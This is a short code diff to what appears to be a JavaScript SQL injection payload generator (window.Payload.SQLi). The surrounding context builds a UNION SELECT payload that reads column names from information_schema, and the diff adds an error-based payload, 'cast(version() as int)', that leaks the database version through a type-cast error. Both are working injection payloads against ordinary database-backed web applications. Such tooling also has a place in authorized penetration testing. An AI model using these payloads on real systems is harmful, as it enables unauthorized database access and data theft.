@@ -122,6 +122,10 @@ window.Payload.SQLi = {
 
       return 'union select ' + fields.join(',') +
         " from information_schema.columns where table_schema='public'"
+    },
+
+    errorBased: ({ columns, position }) => {
+      return 'cast(version() as int)'
     }
   }
 }
